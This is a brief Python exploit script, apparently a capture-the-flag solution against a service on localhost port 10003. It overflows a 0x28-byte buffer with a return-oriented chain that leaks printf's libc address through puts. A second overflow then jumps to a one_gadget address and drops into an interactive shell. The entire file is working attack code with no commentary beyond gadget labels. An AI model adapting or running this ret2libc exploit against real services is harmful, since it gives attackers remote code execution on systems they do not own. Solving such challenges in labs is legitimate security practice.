import socket, time, struct, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10003))


time.sleep(1)

one_gadgets = [324293, 324386, 1090444]

payload = b'A' * 0x28
payload += struct.pack('<Q', 0x0000000000400873)  # pop rdi; ret
payload += struct.pack('<Q', 0x000000601020)  # got printf
payload += struct.pack('<Q', 0x00000000004005d0)  # puts@plt
payload += struct.pack('<Q', 0x0000000000400782)  # main

s.sendall(payload + b'\n')
time.sleep(1)
data = s.recv(1000)

addr_libc = struct.unpack('<Q', data[data.find(b'\n')+1:data.rfind(b'\n')].ljust(8, b'\x00'))[0] - 0x0000000000064e80
print(hex(addr_libc))

payload = b'A' * 0x28
payload += struct.pack('<Q', addr_libc + one_gadgets[0])

s.sendall(payload + b'\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
